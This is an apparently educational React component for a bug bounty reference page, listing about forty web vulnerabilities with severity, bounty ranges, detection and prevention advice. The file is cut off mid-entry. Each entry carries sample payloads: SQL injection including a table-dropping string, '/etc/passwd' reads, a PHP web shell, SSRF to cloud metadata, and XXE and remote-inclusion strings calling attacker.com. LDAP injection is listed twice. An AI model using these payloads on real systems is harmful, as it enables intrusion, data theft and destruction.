import React, { useState } from 'react';
import { Bug, Shield, Target, Search, Filter, Star, DollarSign, TrendingUp, AlertTriangle, Eye, Code, X } from 'lucide-react';

const BugBounty = () => {
  const [selectedVulnerability, setSelectedVulnerability] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [selectedSeverity, setSelectedSeverity] = useState('all');
  const [showModal, setShowModal] = useState(false);

  // Complete Top 50 vulnerabilities commonly found in bug bounty programs
  const vulnerabilities = [
    {
      id: 1,
      name: "Cross-Site Scripting (XSS)",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 6.1,
      bountyRange: "$100 - $5,000",
      frequency: "27.9%",
      description: "Injection of malicious scripts into web pages viewed by other users",
      impact: "Session hijacking, credential theft, defacement, malware distribution",
      types: ["Reflected XSS", "Stored XSS", "DOM-based XSS"],
      detectionMethods: [
        "Manual payload testing in input fields",
        "Automated scanning with tools like Burp Suite",
        "Source code review for unescaped output"
      ],
      exploitExamples: [
        { payload: "<script>alert('XSS')</script>", context: "Basic HTML context" },
        { payload: "<img src=x onerror=alert('XSS')>", context: "Image tag injection" },
        { payload: "javascript:alert('XSS')", context: "URL context" }
      ],
      prevention: [
        "Input validation and sanitization",
        "Output encoding based on context",
        "Content Security Policy (CSP)",
        "Use of secure frameworks"
      ]
    },
    {
      id: 2,
      name: "Improper Authentication",
      category: "Authentication",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $10,000",
      frequency: "14.58%",
      description: "Flaws in authentication mechanisms allowing unauthorized access",
      impact: "Account takeover, unauthorized access to sensitive data",
      types: ["Weak password policies", "Session fixation", "Credential stuffing", "Multi-factor bypass"],
      detectionMethods: [
        "Testing password reset functionality",
        "Session management analysis",
        "Brute force testing",
        "Authentication bypass attempts"
      ],
      exploitExamples: [
        { payload: "Password reset token manipulation", context: "Token-based reset" },
        { payload: "Session ID prediction", context: "Weak session generation" },
        { payload: "SQL injection in login form", context: "Authentication bypass" }
      ],
      prevention: [
        "Strong password policies",
        "Multi-factor authentication",
        "Account lockout mechanisms",
        "Secure session management"
      ]
    },
    {
      id: 3,
      name: "Information Disclosure",
      category: "Information Exposure",
      severity: "Medium",
      cvssScore: 5.3,
      bountyRange: "$50 - $2,000",
      frequency: "13.38%",
      description: "Unintended exposure of sensitive information",
      impact: "Data leakage, privacy violations, reconnaissance for further attacks",
      types: ["Error messages", "Debug information", "Source code exposure", "Directory listing"],
      detectionMethods: [
        "Error message analysis",
        "Directory enumeration",
        "Source code review",
        "Configuration file discovery"
      ],
      exploitExamples: [
        { payload: "Accessing /.git/ directory", context: "Version control exposure" },
        { payload: "SQL error messages revealing database structure", context: "Database information" },
        { payload: "Stack traces in error pages", context: "Application internals" }
      ],
      prevention: [
        "Custom error pages",
        "Proper access controls",
        "Remove debug information",
        "Secure configuration"
      ]
    },
    {
      id: 4,
      name: "Privilege Escalation",
      category: "Authorization",
      severity: "High",
      cvssScore: 8.8,
      bountyRange: "$1,000 - $15,000",
      frequency: "9.44%",
      description: "Gaining higher privileges than intended",
      impact: "Administrative access, system compromise, data manipulation",
      types: ["Vertical escalation", "Horizontal escalation", "Role-based bypass", "Function-level access"],
      detectionMethods: [
        "Role manipulation testing",
        "Parameter tampering",
        "Direct object reference testing",
        "Function-level authorization bypass"
      ],
      exploitExamples: [
        { payload: "Changing user role in request", context: "Parameter manipulation" },
        { payload: "Accessing admin functions directly", context: "URL manipulation" },
        { payload: "JWT token manipulation", context: "Token-based escalation" }
      ],
      prevention: [
        "Proper authorization checks",
        "Role-based access control",
        "Principle of least privilege",
        "Server-side validation"
      ]
    },
    {
      id: 5,
      name: "SQL Injection",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.8,
      bountyRange: "$1,000 - $25,000",
      frequency: "6.6%",
      description: "Injection of malicious SQL code into database queries",
      impact: "Data theft, data manipulation, authentication bypass, remote code execution",
      types: ["Union-based", "Boolean-based blind", "Time-based blind", "Error-based"],
      detectionMethods: [
        "Manual payload testing",
        "Automated tools like SQLMap",
        "Error message analysis",
        "Time delay testing"
      ],
      exploitExamples: [
        { payload: "' OR '1'='1' --", context: "Authentication bypass" },
        { payload: "' UNION SELECT username, password FROM users --", context: "Data extraction" },
        { payload: "'; DROP TABLE users; --", context: "Data destruction" }
      ],
      prevention: [
        "Parameterized queries",
        "Input validation",
        "Stored procedures",
        "Least privilege database access"
      ]
    },
    {
      id: 6,
      name: "Code Injection",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.3,
      bountyRange: "$2,000 - $30,000",
      frequency: "6.04%",
      description: "Injection of malicious code into application execution flow",
      impact: "Remote code execution, system compromise, data theft",
      types: ["Command injection", "PHP code injection", "Python code injection", "JavaScript injection"],
      detectionMethods: [
        "Command execution testing",
        "Code evaluation testing",
        "File inclusion testing",
        "Template injection testing"
      ],
      exploitExamples: [
        { payload: "; cat /etc/passwd", context: "Command injection" },
        { payload: "<?php system($_GET['cmd']); ?>", context: "PHP code injection" },
        { payload: "eval(user_input)", context: "Dynamic code execution" }
      ],
      prevention: [
        "Input validation and sanitization",
        "Avoid dynamic code execution",
        "Use safe APIs",
        "Sandboxing and containerization"
      ]
    },
    {
      id: 7,
      name: "Server-Side Request Forgery (SSRF)",
      category: "Network",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $10,000",
      frequency: "5.69%",
      description: "Forcing server to make requests to unintended locations",
      impact: "Internal network access, cloud metadata access, port scanning",
      types: ["Basic SSRF", "Blind SSRF", "Semi-blind SSRF", "Time-based SSRF"],
      detectionMethods: [
        "URL parameter manipulation",
        "Webhook testing",
        "File upload with external references",
        "DNS callback testing"
      ],
      exploitExamples: [
        { payload: "http://169.254.169.254/latest/meta-data/", context: "AWS metadata access" },
        { payload: "http://localhost:22", context: "Internal port scanning" },
        { payload: "file:///etc/passwd", context: "Local file access" }
      ],
      prevention: [
        "URL validation and whitelisting",
        "Network segmentation",
        "Disable unnecessary protocols",
        "Response validation"
      ]
    },
    {
      id: 8,
      name: "Insecure Direct Object Reference (IDOR)",
      category: "Authorization",
      severity: "Medium",
      cvssScore: 6.5,
      bountyRange: "$200 - $5,000",
      frequency: "5.53%",
      description: "Direct access to objects without proper authorization",
      impact: "Unauthorized data access, privacy violations, data manipulation",
      types: ["Numeric IDOR", "GUID IDOR", "Encoded IDOR", "Nested IDOR"],
      detectionMethods: [
        "Parameter manipulation",
        "ID enumeration",
        "Response analysis",
        "Burp Suite Intruder"
      ],
      exploitExamples: [
        { payload: "GET /user/profile?id=1234", context: "User profile access" },
        { payload: "GET /api/documents/12345", context: "Document access" },
        { payload: "POST /delete/order/9876", context: "Order manipulation" }
      ],
      prevention: [
        "Proper authorization checks",
        "Indirect object references",
        "Access control validation",
        "User context verification"
      ]
    },
    {
      id: 9,
      name: "Improper Access Control",
      category: "Authorization",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$300 - $8,000",
      frequency: "5.42%",
      description: "Inadequate enforcement of access restrictions",
      impact: "Unauthorized access, data breach, privilege escalation",
      types: ["Missing access control", "Broken access control", "Inconsistent access control"],
      detectionMethods: [
        "Role-based testing",
        "URL manipulation",
        "Function-level testing",
        "API endpoint enumeration"
      ],
      exploitExamples: [
        { payload: "Accessing admin panel without authentication", context: "Missing access control" },
        { payload: "Modifying other users' data", context: "Broken authorization" },
        { payload: "Accessing restricted API endpoints", context: "API access control" }
      ],
      prevention: [
        "Implement proper access controls",
        "Regular access reviews",
        "Principle of least privilege",
        "Centralized authorization"
      ]
    },
    {
      id: 10,
      name: "Cross-Site Request Forgery (CSRF)",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 6.5,
      bountyRange: "$100 - $3,000",
      frequency: "5.42%",
      description: "Forcing users to perform unwanted actions on authenticated applications",
      impact: "Unauthorized actions, data modification, account compromise",
      types: ["GET-based CSRF", "POST-based CSRF", "JSON CSRF", "File upload CSRF"],
      detectionMethods: [
        "Missing CSRF tokens",
        "Weak CSRF protection",
        "SameSite cookie testing",
        "Referer header bypass"
      ],
      exploitExamples: [
        { payload: "<img src='http://bank.com/transfer?amount=1000&to=attacker'>", context: "GET-based attack" },
        { payload: "Auto-submitting form", context: "POST-based attack" },
        { payload: "AJAX request without CSRF token", context: "JSON-based attack" }
      ],
      prevention: [
        "CSRF tokens",
        "SameSite cookies",
        "Double submit cookies",
        "Custom headers validation"
      ]
    },
    {
      id: 11,
      name: "XML External Entity (XXE)",
      category: "Injection",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $8,000",
      frequency: "4.2%",
      description: "Processing of external XML entities leading to data disclosure",
      impact: "File disclosure, SSRF, denial of service, remote code execution",
      types: ["Classic XXE", "Blind XXE", "Error-based XXE", "Out-of-band XXE"],
      detectionMethods: [
        "XML payload injection",
        "External entity testing",
        "File inclusion attempts",
        "Network callback testing"
      ],
      exploitExamples: [
        { payload: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", context: "File disclosure" },
        { payload: "<!ENTITY xxe SYSTEM 'http://attacker.com/'>", context: "SSRF via XXE" }
      ],
      prevention: [
        "Disable external entity processing",
        "Use less complex data formats",
        "Input validation",
        "XML parser hardening"
      ]
    },
    {
      id: 12,
      name: "Remote Code Execution (RCE)",
      category: "Code Execution",
      severity: "Critical",
      cvssScore: 9.8,
      bountyRange: "$5,000 - $50,000",
      frequency: "3.8%",
      description: "Execution of arbitrary code on the target system",
      impact: "Complete system compromise, data theft, malware installation",
      types: ["Command injection", "File upload RCE", "Deserialization RCE", "Template injection"],
      detectionMethods: [
        "Command execution testing",
        "File upload exploitation",
        "Deserialization testing",
        "Template injection testing"
      ],
      exploitExamples: [
        { payload: "system('whoami')", context: "Direct command execution" },
        { payload: "<?php system($_GET['cmd']); ?>", context: "Web shell upload" }
      ],
      prevention: [
        "Input validation",
        "Sandboxing",
        "Principle of least privilege",
        "Code review"
      ]
    },
    {
      id: 13,
      name: "Local File Inclusion (LFI)",
      category: "File Inclusion",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$300 - $5,000",
      frequency: "3.5%",
      description: "Including local files from the server file system",
      impact: "Source code disclosure, configuration file access, log file access",
      types: ["Basic LFI", "LFI with null byte", "LFI with encoding", "LFI to RCE"],
      detectionMethods: [
        "Path traversal testing",
        "File inclusion attempts",
        "Null byte injection",
        "Encoding bypass testing"
      ],
      exploitExamples: [
        { payload: "../../../etc/passwd", context: "Path traversal" },
        { payload: "....//....//etc/passwd", context: "Filter bypass" }
      ],
      prevention: [
        "Input validation",
        "Whitelist allowed files",
        "Disable dangerous functions",
        "Use absolute paths"
      ]
    },
    {
      id: 14,
      name: "Remote File Inclusion (RFI)",
      category: "File Inclusion",
      severity: "Critical",
      cvssScore: 8.8,
      bountyRange: "$1,000 - $15,000",
      frequency: "2.9%",
      description: "Including remote files from external servers",
      impact: "Remote code execution, malware installation, system compromise",
      types: ["HTTP RFI", "FTP RFI", "Data URI RFI", "PHP wrapper RFI"],
      detectionMethods: [
        "Remote URL inclusion",
        "External file testing",
        "Protocol wrapper testing",
        "Callback verification"
      ],
      exploitExamples: [
        { payload: "http://attacker.com/shell.php", context: "Remote shell inclusion" },
        { payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", context: "Data URI RFI" }
      ],
      prevention: [
        "Disable remote file inclusion",
        "Input validation",
        "Use whitelists",
        "Network restrictions"
      ]
    },
    {
      id: 15,
      name: "Business Logic Flaws",
      category: "Logic",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $10,000",
      frequency: "2.7%",
      description: "Flaws in application business logic and workflow",
      impact: "Financial loss, unauthorized access, data manipulation",
      types: ["Race conditions", "Price manipulation", "Workflow bypass", "Rate limiting bypass"],
      detectionMethods: [
        "Workflow analysis",
        "Race condition testing",
        "Parameter manipulation",
        "Logic flow testing"
      ],
      exploitExamples: [
        { payload: "Negative quantity in shopping cart", context: "Price manipulation" },
        { payload: "Concurrent requests to exploit race condition", context: "Race condition" }
      ],
      prevention: [
        "Proper workflow validation",
        "Atomic operations",
        "Input validation",
        "Business rule enforcement"
      ]
    },
    {
      id: 16,
      name: "Open Redirect",
      category: "Web Application",
      severity: "Low",
      cvssScore: 4.3,
      bountyRange: "$50 - $1,000",
      frequency: "2.5%",
      description: "Redirecting users to malicious external websites",
      impact: "Phishing attacks, credential theft, malware distribution",
      types: ["URL parameter redirect", "Header-based redirect", "JavaScript redirect", "Meta refresh redirect"],
      detectionMethods: [
        "URL parameter manipulation",
        "Header injection testing",
        "JavaScript analysis",
        "Meta tag inspection"
      ],
      exploitExamples: [
        { payload: "?redirect=http://evil.com", context: "URL parameter redirect" },
        { payload: "Location: http://evil.com", context: "Header injection" }
      ],
      prevention: [
        "URL validation",
        "Whitelist allowed domains",
        "Relative redirects",
        "User confirmation"
      ]
    },
    {
      id: 17,
      name: "Clickjacking",
      category: "UI Redressing",
      severity: "Medium",
      cvssScore: 5.4,
      bountyRange: "$100 - $2,000",
      frequency: "2.3%",
      description: "Tricking users into clicking on hidden elements",
      impact: "Unauthorized actions, social engineering, credential theft",
      types: ["Basic clickjacking", "Likejacking", "Cursorjacking", "Drag and drop attacks"],
      detectionMethods: [
        "Frame embedding testing",
        "X-Frame-Options header check",
        "CSP frame-ancestors check",
        "UI overlay testing"
      ],
      exploitExamples: [
        { payload: "<iframe src='target.com' style='opacity:0'></iframe>", context: "Invisible iframe" },
        { payload: "Overlay transparent button", context: "UI redressing" }
      ],
      prevention: [
        "X-Frame-Options header",
        "CSP frame-ancestors",
        "Frame busting scripts",
        "SameSite cookies"
      ]
    },
    {
      id: 18,
      name: "Subdomain Takeover",
      category: "DNS",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $5,000",
      frequency: "2.1%",
      description: "Taking control of unused subdomains",
      impact: "Phishing, malware distribution, reputation damage",
      types: ["CNAME takeover", "A record takeover", "Service-specific takeover"],
      detectionMethods: [
        "DNS record enumeration",
        "Subdomain discovery",
        "Service fingerprinting",
        "Takeover verification"
      ],
      exploitExamples: [
        { payload: "Claiming abandoned AWS S3 bucket", context: "S3 subdomain takeover" },
        { payload: "Registering expired service", context: "Service takeover" }
      ],
      prevention: [
        "Regular DNS audits",
        "Remove unused records",
        "Monitor subdomains",
        "Service lifecycle management"
      ]
    },
    {
      id: 19,
      name: "Insecure Deserialization",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.8,
      bountyRange: "$2,000 - $25,000",
      frequency: "1.9%",
      description: "Unsafe deserialization of untrusted data",
      impact: "Remote code execution, privilege escalation, authentication bypass",
      types: ["Java deserialization", "PHP deserialization", "Python pickle", ".NET deserialization"],
      detectionMethods: [
        "Serialized data analysis",
        "Payload crafting",
        "Library vulnerability testing",
        "Object injection testing"
      ],
      exploitExamples: [
        { payload: "Malicious Java serialized object", context: "Java RCE" },
        { payload: "PHP object injection", context: "PHP deserialization" }
      ],
      prevention: [
        "Avoid deserializing untrusted data",
        "Use safe serialization formats",
        "Input validation",
        "Integrity checks"
      ]
    },
    {
      id: 20,
      name: "HTTP Request Smuggling",
      category: "Protocol",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$1,000 - $10,000",
      frequency: "1.7%",
      description: "Exploiting differences in HTTP request parsing",
      impact: "Cache poisoning, request hijacking, security bypass",
      types: ["CL.TE smuggling", "TE.CL smuggling", "TE.TE smuggling", "HTTP/2 smuggling"],
      detectionMethods: [
        "Request splitting testing",
        "Header manipulation",
        "Timing analysis",
        "Response analysis"
      ],
      exploitExamples: [
        { payload: "Content-Length and Transfer-Encoding conflict", context: "CL.TE smuggling" },
        { payload: "Chunked encoding manipulation", context: "TE.CL smuggling" }
      ],
      prevention: [
        "Consistent parsing",
        "Reject ambiguous requests",
        "Use HTTP/2",
        "Proxy configuration"
      ]
    },
    {
      id: 21,
      name: "NoSQL Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $8,000",
      frequency: "1.5%",
      description: "Injection attacks against NoSQL databases",
      impact: "Data theft, authentication bypass, data manipulation",
      types: ["MongoDB injection", "CouchDB injection", "Redis injection"],
      detectionMethods: [
        "NoSQL syntax testing",
        "Parameter manipulation",
        "Error message analysis",
        "Boolean-based testing"
      ],
      exploitExamples: [
        { payload: "{\"$ne\": null}", context: "MongoDB authentication bypass" },
        { payload: "{\"$where\": \"return true\"}", context: "JavaScript injection" }
      ],
      prevention: [
        "Input validation",
        "Parameterized queries",
        "Least privilege access",
        "Query whitelisting"
      ]
    },
    {
      id: 22,
      name: "LDAP Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$300 - $5,000",
      frequency: "1.3%",
      description: "Injection attacks against LDAP queries",
      impact: "Authentication bypass, information disclosure",
      types: ["AND/OR injection", "Blind LDAP injection"],
      detectionMethods: [
        "LDAP syntax testing",
        "Special character injection",
        "Error message analysis",
        "Timing analysis"
      ],
      exploitExamples: [
        { payload: "*)(uid=*))(|(uid=*", context: "Authentication bypass" },
        { payload: "admin)(&(password=*)", context: "Password enumeration" }
      ],
      prevention: [
        "Input validation",
        "Parameterized queries",
        "Escape special characters",
        "Least privilege access"
      ]
    },
    {
      id: 23,
      name: "Template Injection",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.3,
      bountyRange: "$1,000 - $15,000",
      frequency: "1.2%",
      description: "Injection into template engines",
      impact: "Remote code execution, information disclosure",
      types: ["Server-side template injection", "Client-side template injection"],
      detectionMethods: [
        "Template syntax testing",
        "Expression evaluation",
        "Error message analysis",
        "Payload crafting"
      ],
      exploitExamples: [
        { payload: "{{7*7}}", context: "Basic template injection" },
        { payload: "{{config.items()}}", context: "Configuration disclosure" }
      ],
      prevention: [
        "Input validation",
        "Sandboxed templates",
        "Logic-less templates",
        "Output encoding"
      ]
    },
    {
      id: 24,
      name: "Race Conditions",
      category: "Logic",
      severity: "Medium",
      cvssScore: 6.1,
      bountyRange: "$200 - $3,000",
      frequency: "1.1%",
      description: "Exploiting timing vulnerabilities in concurrent operations",
      impact: "Data corruption, privilege escalation, financial loss",
      types: ["Time-of-check to time-of-use", "Resource race conditions"],
      detectionMethods: [
        "Concurrent request testing",
        "Timing analysis",
        "Resource monitoring",
        "State manipulation"
      ],
      exploitExamples: [
        { payload: "Simultaneous withdrawal requests", context: "Banking race condition" },
        { payload: "Concurrent file operations", context: "File system race" }
      ],
      prevention: [
        "Atomic operations",
        "Proper locking",
        "Transaction isolation",
        "State validation"
      ]
    },
    {
      id: 25,
      name: "Weak Cryptography",
      category: "Cryptography",
      severity: "Medium",
      cvssScore: 5.9,
      bountyRange: "$100 - $2,000",
      frequency: "1.0%",
      description: "Use of weak cryptographic algorithms or implementations",
      impact: "Data decryption, authentication bypass, integrity compromise",
      types: ["Weak algorithms", "Poor key management", "Implementation flaws"],
      detectionMethods: [
        "Algorithm identification",
        "Key strength analysis",
        "Implementation testing",
        "Cryptographic analysis"
      ],
      exploitExamples: [
        { payload: "MD5 hash collision", context: "Weak hashing" },
        { payload: "DES encryption breaking", context: "Weak encryption" }
      ],
      prevention: [
        "Strong algorithms",
        "Proper key management",
        "Regular updates",
        "Cryptographic review"
      ]
    },
    {
      id: 26,
      name: "Session Fixation",
      category: "Session Management",
      severity: "Medium",
      cvssScore: 6.1,
      bountyRange: "$200 - $3,000",
      frequency: "0.9%",
      description: "Forcing a user to use a known session ID",
      impact: "Session hijacking, unauthorized access",
      types: ["URL-based fixation", "Cookie-based fixation"],
      detectionMethods: [
        "Session ID analysis",
        "Login flow testing",
        "Session regeneration testing",
        "Cookie manipulation"
      ],
      exploitExamples: [
        { payload: "Setting session ID before login", context: "Pre-authentication fixation" },
        { payload: "Session ID in URL", context: "URL-based fixation" }
      ],
      prevention: [
        "Session regeneration",
        "Secure session management",
        "Random session IDs",
        "Session validation"
      ]
    },
    {
      id: 27,
      name: "HTTP Parameter Pollution",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 5.4,
      bountyRange: "$100 - $2,000",
      frequency: "0.8%",
      description: "Supplying multiple parameters with the same name",
      impact: "Input validation bypass, logic errors",
      types: ["Query parameter pollution", "Form parameter pollution"],
      detectionMethods: [
        "Parameter duplication testing",
        "Server behavior analysis",
        "Input validation testing",
        "Logic flow analysis"
      ],
      exploitExamples: [
        { payload: "?user=admin&user=guest", context: "Parameter confusion" },
        { payload: "Multiple form fields with same name", context: "Form pollution" }
      ],
      prevention: [
        "Parameter validation",
        "Consistent parsing",
        "Input sanitization",
        "Server configuration"
      ]
    },
    {
      id: 28,
      name: "Host Header Injection",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 5.4,
      bountyRange: "$100 - $2,000",
      frequency: "0.7%",
      description: "Manipulating the Host header to cause unintended behavior",
      impact: "Cache poisoning, password reset poisoning, SSRF",
      types: ["Password reset poisoning", "Cache poisoning", "Virtual host confusion"],
      detectionMethods: [
        "Host header manipulation",
        "Response analysis",
        "Cache behavior testing",
        "Email content analysis"
      ],
      exploitExamples: [
        { payload: "Host: evil.com", context: "Password reset poisoning" },
        { payload: "Host: internal.server", context: "Virtual host bypass" }
      ],
      prevention: [
        "Host validation",
        "Absolute URLs",
        "Server configuration",
        "Input validation"
      ]
    },
    {
      id: 29,
      name: "CORS Misconfiguration",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 5.4,
      bountyRange: "$200 - $3,000",
      frequency: "0.6%",
      description: "Improper Cross-Origin Resource Sharing configuration",
      impact: "Data theft, credential theft, unauthorized actions",
      types: ["Wildcard origin", "Null origin", "Subdomain bypass"],
      detectionMethods: [
        "Origin header manipulation",
        "CORS policy testing",
        "Preflight request analysis",
        "Credential inclusion testing"
      ],
      exploitExamples: [
        { payload: "Origin: https://evil.com", context: "Wildcard exploitation" },
        { payload: "Origin: null", context: "Null origin bypass" }
      ],
      prevention: [
        "Proper origin validation",
        "Avoid wildcards",
        "Credential restrictions",
        "Regular audits"
      ]
    },
    {
      id: 30,
      name: "JWT Vulnerabilities",
      category: "Authentication",
      severity: "High",
      cvssScore: 7.5,
      bountyRange: "$500 - $5,000",
      frequency: "0.5%",
      description: "Flaws in JSON Web Token implementation",
      impact: "Authentication bypass, privilege escalation",
      types: ["Algorithm confusion", "Weak secrets", "None algorithm"],
      detectionMethods: [
        "JWT structure analysis",
        "Algorithm manipulation",
        "Signature verification testing",
        "Secret brute forcing"
      ],
      exploitExamples: [
        { payload: "Changing algorithm to 'none'", context: "Algorithm bypass" },
        { payload: "RS256 to HS256 confusion", context: "Algorithm confusion" }
      ],
      prevention: [
        "Strong secrets",
        "Algorithm whitelisting",
        "Proper validation",
        "Regular rotation"
      ]
    },
    {
      id: 31,
      name: "GraphQL Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.2,
      bountyRange: "$300 - $4,000",
      frequency: "0.4%",
      description: "Injection attacks against GraphQL APIs",
      impact: "Data extraction, DoS, unauthorized access",
      types: ["Query injection", "Mutation injection", "Introspection abuse"],
      detectionMethods: [
        "GraphQL query manipulation",
        "Introspection testing",
        "Nested query testing",
        "Mutation analysis"
      ],
      exploitExamples: [
        { payload: "Deeply nested queries", context: "DoS attack" },
        { payload: "Introspection query", context: "Schema disclosure" }
      ],
      prevention: [
        "Query depth limiting",
        "Rate limiting",
        "Disable introspection",
        "Input validation"
      ]
    },
    {
      id: 32,
      name: "WebSocket Vulnerabilities",
      category: "Protocol",
      severity: "Medium",
      cvssScore: 6.0,
      bountyRange: "$200 - $2,500",
      frequency: "0.4%",
      description: "Security flaws in WebSocket implementations",
      impact: "Data manipulation, unauthorized access, DoS",
      types: ["Origin bypass", "Authentication bypass", "Message injection"],
      detectionMethods: [
        "WebSocket handshake analysis",
        "Origin header testing",
        "Message manipulation",
        "Authentication testing"
      ],
      exploitExamples: [
        { payload: "Manipulated Origin header", context: "Origin bypass" },
        { payload: "Injected WebSocket message", context: "Message injection" }
      ],
      prevention: [
        "Origin validation",
        "Authentication enforcement",
        "Message validation",
        "Rate limiting"
      ]
    },
    {
      id: 33,
      name: "API Rate Limiting Bypass",
      category: "API Security",
      severity: "Medium",
      cvssScore: 5.8,
      bountyRange: "$100 - $1,500",
      frequency: "0.3%",
      description: "Bypassing API rate limiting mechanisms",
      impact: "DoS, resource exhaustion, brute force attacks",
      types: ["Header manipulation", "IP rotation", "Distributed requests"],
      detectionMethods: [
        "Rate limit testing",
        "Header manipulation",
        "IP address testing",
        "Request pattern analysis"
      ],
      exploitExamples: [
        { payload: "X-Forwarded-For header manipulation", context: "IP spoofing" },
        { payload: "Distributed request sources", context: "Rate limit bypass" }
      ],
      prevention: [
        "Proper rate limiting",
        "IP validation",
        "Distributed rate limiting",
        "Monitoring"
      ]
    },
    {
      id: 34,
      name: "File Upload Vulnerabilities",
      category: "File Handling",
      severity: "High",
      cvssScore: 7.8,
      bountyRange: "$500 - $8,000",
      frequency: "0.3%",
      description: "Insecure file upload functionality",
      impact: "Remote code execution, defacement, malware upload",
      types: ["Unrestricted file upload", "Path traversal", "MIME type bypass"],
      detectionMethods: [
        "File type testing",
        "Extension manipulation",
        "Content-Type bypass",
        "Path traversal testing"
      ],
      exploitExamples: [
        { payload: "Uploading PHP shell", context: "Web shell upload" },
        { payload: "../../../shell.php", context: "Path traversal" }
      ],
      prevention: [
        "File type validation",
        "Content scanning",
        "Isolated storage",
        "Execution prevention"
      ]
    },
    {
      id: 35,
      name: "OAuth Vulnerabilities",
      category: "Authentication",
      severity: "High",
      cvssScore: 7.3,
      bountyRange: "$400 - $6,000",
      frequency: "0.3%",
      description: "Flaws in OAuth implementation",
      impact: "Account takeover, unauthorized access, token theft",
      types: ["Authorization code interception", "CSRF in OAuth flow", "Redirect URI manipulation"],
      detectionMethods: [
        "OAuth flow analysis",
        "Redirect URI testing",
        "State parameter testing",
        "Token validation testing"
      ],
      exploitExamples: [
        { payload: "Manipulated redirect_uri", context: "Authorization code theft" },
        { payload: "Missing state parameter", context: "CSRF attack" }
      ],
      prevention: [
        "Proper redirect URI validation",
        "State parameter usage",
        "PKCE implementation",
        "Token validation"
      ]
    },
    {
      id: 36,
      name: "DNS Rebinding",
      category: "Network",
      severity: "Medium",
      cvssScore: 6.2,
      bountyRange: "$200 - $3,000",
      frequency: "0.2%",
      description: "Bypassing same-origin policy via DNS manipulation",
      impact: "Internal network access, firewall bypass",
      types: ["Classic DNS rebinding", "Multiple A record attack"],
      detectionMethods: [
        "DNS resolution testing",
        "TTL manipulation",
        "Internal network probing",
        "Same-origin policy testing"
      ],
      exploitExamples: [
        { payload: "DNS record with low TTL", context: "Rebinding attack" },
        { payload: "Multiple A records", context: "Internal access" }
      ],
      prevention: [
        "DNS validation",
        "Network segmentation",
        "Firewall rules",
        "Host header validation"
      ]
    },
    {
      id: 37,
      name: "Cache Poisoning",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 5.9,
      bountyRange: "$300 - $4,000",
      frequency: "0.2%",
      description: "Manipulating cache to serve malicious content",
      impact: "Content manipulation, XSS, defacement",
      types: ["HTTP cache poisoning", "Web cache deception"],
      detectionMethods: [
        "Cache behavior analysis",
        "Header manipulation",
        "Response analysis",
        "Cache key testing"
      ],
      exploitExamples: [
        { payload: "X-Forwarded-Host manipulation", context: "Cache poisoning" },
        { payload: "Cache key confusion", context: "Content manipulation" }
      ],
      prevention: [
        "Proper cache configuration",
        "Header validation",
        "Cache key normalization",
        "Response validation"
      ]
    },
    {
      id: 38,
      name: "Prototype Pollution",
      category: "JavaScript",
      severity: "Medium",
      cvssScore: 6.1,
      bountyRange: "$200 - $2,500",
      frequency: "0.2%",
      description: "Modifying JavaScript object prototypes",
      impact: "Property injection, logic bypass, DoS",
      types: ["Client-side pollution", "Server-side pollution"],
      detectionMethods: [
        "Object property testing",
        "Prototype chain analysis",
        "JSON payload testing",
        "Library vulnerability testing"
      ],
      exploitExamples: [
        { payload: "{\"__proto__\": {\"isAdmin\": true}}", context: "Property injection" },
        { payload: "constructor.prototype pollution", context: "Prototype manipulation" }
      ],
      prevention: [
        "Input validation",
        "Object.create(null)",
        "Library updates",
        "Prototype freezing"
      ]
    },
    {
      id: 39,
      name: "SMTP Header Injection",
      category: "Injection",
      severity: "Medium",
      cvssScore: 5.7,
      bountyRange: "$100 - $1,500",
      frequency: "0.2%",
      description: "Injecting headers into SMTP communications",
      impact: "Email spoofing, spam relay, information disclosure",
      types: ["Email header injection", "SMTP command injection"],
      detectionMethods: [
        "Email header manipulation",
        "SMTP command testing",
        "Email content analysis",
        "Relay testing"
      ],
      exploitExamples: [
        { payload: "Subject: Test\\r\\nBcc: attacker@evil.com", context: "Header injection" },
        { payload: "SMTP command injection", context: "Command injection" }
      ],
      prevention: [
        "Input validation",
        "Header sanitization",
        "SMTP configuration",
        "Email validation"
      ]
    },
    {
      id: 40,
      name: "LDAP Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.1,
      bountyRange: "$300 - $4,000",
      frequency: "0.1%",
      description: "Injection attacks against LDAP directories",
      impact: "Authentication bypass, data extraction",
      types: ["AND/OR injection", "Wildcard injection"],
      detectionMethods: [
        "LDAP filter manipulation",
        "Special character testing",
        "Error message analysis",
        "Authentication testing"
      ],
      exploitExamples: [
        { payload: "*)(uid=*))(|(uid=*", context: "Authentication bypass" },
        { payload: "LDAP wildcard injection", context: "Data enumeration" }
      ],
      prevention: [
        "Input validation",
        "Parameterized queries",
        "Escape sequences",
        "Access controls"
      ]
    },
    {
      id: 41,
      name: "XPath Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.0,
      bountyRange: "$300 - $3,500",
      frequency: "0.1%",
      description: "Injection attacks against XPath queries",
      impact: "Data extraction, authentication bypass",
      types: ["Boolean-based injection", "Error-based injection"],
